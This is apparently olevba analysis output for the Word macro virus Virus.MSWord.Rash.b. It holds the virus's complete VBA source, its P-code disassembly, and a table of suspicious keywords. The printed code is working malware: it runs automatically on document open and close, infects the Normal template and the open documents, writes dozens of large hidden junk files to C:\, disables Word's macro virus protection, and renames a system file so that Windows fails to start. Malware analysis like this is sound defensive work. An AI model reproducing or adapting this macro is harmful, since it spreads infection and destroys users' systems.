olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rash.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rash.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Shock()
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Document_Close
End Sub
Private Sub Porcher()
Dim bas(190)
Namer = "Ïîð÷àÄåÃåíåðàòîð"
Rem ++++++++++++++++++++++++++
Rem ++      +++++ +++++++ ++++
Rem ++ +++++ ++++ +++++++ ++++
Rem ++ +++++ ++++ +++++++ ++++
Rem ++ +++++ ++++ +++++++ ++++++++
Rem ++      +++++ +++++++ ++++++++++++
Rem ++ ++++ +++++ +++++++ ++++++++++++++
Rem ++ +++++ +++++       ++++++++++++
Rem +++++++++++++++++++++++++++++
bo1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
bo2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
KK = 0
If bo1 <> "Private Sub Shock()" Then
Set bst = NormalTemplate.VBProject.VBComponents.Item(1)
KK = 1
End If
If bo2 <> "Private Sub Shock()" Then
Set bst = ActiveDocument.VBProject.VBComponents.Item(1)
KK = 1
End If
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
If KK > 0 Then
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
bol = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For bi = 1 To bol
   bas(bi) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(bi, 1)
  Next bi
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  For bi = 1 To bol
   bst.CodeModule.InsertLines bi, bas(bi)
  Next bi
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End If
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Negr = "KilleRRRRRash"
For bi = 1 To 40
 bnam = "c:\"
  For bj = 1 To 6
   bkk = Int(10 * Rnd) + 1
   bnam = bnam + Mid(Negr, bkk, 1)
  Next bj
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 bnam = bnam + ".sys"
 Open bnam For Output As #1
 Seek #1, 65535 * 8
 Print #1, "×òîáû ïîìíèëè... FOREVER!!!"
 Close #1
 SetAttr bnam, 6
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Next bi

Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Name "c:\Windows\Command\edit.com" As "C:\Windows\Win.com"
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End Sub
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Private Sub Document_Open()
Shock
End Sub

Private Sub Document_Close()
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
daa = Date
Porcher
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rash.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10670 bytes
' Line #0:
' 	FuncDefn (Private Sub Shock())
' Line #1:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #2:
' 	Rem 0x0040 " + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+"
' Line #3:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #4:
' 	ArgsCall Document_Close 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub Porcher())
' Line #7:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00BE 
' 	VarDefn bas
' Line #8:
' 	LitStr 0x0010 "Ïîð÷àÄåÃåíåðàòîð"
' 	St Namer 
' Line #9:
' 	Rem 0x001B " ++++++++++++++++++++++++++"
' Line #10:
' 	Rem 0x001B " ++      +++++ +++++++ ++++"
' Line #11:
' 	Rem 0x001B " ++ +++++ ++++ +++++++ ++++"
' Line #12:
' 	Rem 0x001B " ++ +++++ ++++ +++++++ ++++"
' Line #13:
' 	Rem 0x001F " ++ +++++ ++++ +++++++ ++++++++"
' Line #14:
' 	Rem 0x0023 " ++      +++++ +++++++ ++++++++++++"
' Line #15:
' 	Rem 0x0025 " ++ ++++ +++++ +++++++ ++++++++++++++"
' Line #16:
' 	Rem 0x0022 " ++ +++++ +++++       ++++++++++++"
' Line #17:
' 	Rem 0x001E " +++++++++++++++++++++++++++++"
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St bo1 
' Line #19:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St bo2 
' Line #21:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #22:
' 	LitDI2 0x0000 
' 	St KK 
' Line #23:
' 	Ld bo1 
' 	LitStr 0x0013 "Private Sub Shock()"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bst 
' Line #25:
' 	LitDI2 0x0001 
' 	St KK 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld bo2 
' 	LitStr 0x0013 "Private Sub Shock()"
' 	Ne 
' 	IfBlock 
' Line #28:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bst 
' Line #29:
' 	LitDI2 0x0001 
' 	St KK 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #32:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #33:
' 	Ld KK 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #34:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #35:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St bol 
' Line #36:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bol 
' 	For 
' Line #37:
' 	Ld bi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld bi 
' 	ArgsSt bas 0x0001 
' Line #38:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #40:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bol 
' 	For 
' Line #41:
' 	Ld bi 
' 	Ld bi 
' 	ArgsLd bas 0x0001 
' 	Ld bst 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #46:
' 	LitStr 0x000D "KilleRRRRRash"
' 	St Negr 
' Line #47:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0028 
' 	For 
' Line #48:
' 	LitStr 0x0003 "c:\"
' 	St bnam 
' Line #49:
' 	StartForVariable 
' 	Ld bj 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #50:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St bkk 
' Line #51:
' 	Ld bnam 
' 	Ld Negr 
' 	Ld bkk 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St bnam 
' Line #52:
' 	StartForVariable 
' 	Ld bj 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #54:
' 	Ld bnam 
' 	LitStr 0x0004 ".sys"
' 	Add 
' 	St bnam 
' Line #55:
' 	Ld bnam 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI4 0xFFFF 0x0000 
' 	LitDI2 0x0008 
' 	Mul 
' 	Seek 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "×òîáû ïîìíèëè... FOREVER!!!"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #59:
' 	Ld bnam 
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #60:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #61:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' Line #63:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #64:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #65:
' 	LitStr 0x001B "c:\Windows\Command\edit.com"
' 	LitStr 0x0012 "C:\Windows\Win.com"
' 	Name 
' Line #66:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #67:
' 	EndSub 
' Line #68:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #69:
' Line #70:
' 	FuncDefn (Private Sub Document_Open())
' Line #71:
' 	ArgsCall Shock 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub Document_Close())
' Line #75:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #76:
' 	Ld Date 
' 	St daa 
' Line #77:
' 	ArgsCall Porcher 0x0000 
' Line #78:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #79:
' 	EndSub 
' Line #80:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

